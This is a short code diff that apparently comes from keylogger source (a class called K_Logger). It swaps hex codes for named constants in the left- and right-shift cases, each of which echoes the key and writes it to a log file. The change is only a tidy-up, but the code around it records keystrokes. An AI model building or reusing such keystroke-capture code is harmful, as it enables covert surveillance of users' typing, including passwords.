@@ -708,12 +708,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("\n");
 			break;
 
-		case 0xA0:
+		case VK_LSHIFT:
 			std::cout << " *Left_Shift* ";
 			WriteToFile(" *Left_Shift* ");
 			break;
 
-		case 0xA1:
+		case VK_RSHIFT:
 			std::cout << " *Right_Shift* ";
 			WriteToFile(" *Right_Shift* ");
 			break;
